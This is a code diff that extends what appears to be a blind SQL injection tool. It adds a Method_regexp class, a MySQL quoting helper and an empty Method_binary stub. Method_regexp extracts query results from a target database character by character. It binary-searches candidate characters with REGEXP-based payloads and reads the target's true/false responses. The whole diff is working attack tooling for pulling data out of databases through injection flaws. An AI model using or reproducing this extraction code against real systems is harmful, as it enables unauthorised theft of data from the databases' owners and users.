@@ -411,6 +411,70 @@ class Method_bitwise(Method_Blind):
           sleep(try_count * 2)
           requester = self.make_requester()
           continue
+
+class Method_binary(Method_Blind):
+  '''Binary Search'''
+  pass
+
+def quote_mysql(s):
+  s = s.replace("'", "''")
+  return s
+
+def quote_prefix(s):
+  return s.replace('.', r'\\.').replace('*', r'\\*').replace('+', r'\\+').replace('?', r'\\?').replace('$', r'\\$')
+
+class Method_regexp(Method_bitwise):
+
+  def get_row(self, query, row_pos=0):
+    result = ''
+
+    while True:
+      s = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._%@!\'"#$&*+?,/:;<=>`~\x1f' # removed: ][\^|-{}()
+      prev_state = 0
+
+      while len(s) > 1:
+
+        left = s[:len(s) / 2]
+        right = s[len(s) / 2:]
+
+        regexp = '^%s[%s]' % ('.' * len(result), left)
+        regexp = quote_mysql(regexp)
+
+        payload = make_payload(self.template, ('query', query), ('regexp', regexp), ('row_pos', row_pos))
+
+        self.taskq.put_nowait((0, payload))
+
+        _, state = self.get_state()
+
+        if state:
+          s = left
+          prev_left = left
+
+        else:
+          if prev_state == 1:
+            s = prev_left[len(left):]
+          else:
+            s = right
+
+        prev_state = state
+
+      char = s[0]
+      logger.debug('char: %d (%r)' % (ord(char), char))
+
+      if char == '\x1f':
+        break
+
+      sys.stdout.write('%s' % char)
+      sys.stdout.flush()
+
+      result += char
+
+    sys.stdout.write('\r')
+    sys.stdout.flush()
+
+    logger.debug('row %d: %s' % (row_pos, result))
+    return result
+
 # }}}
 
 # Main {{{
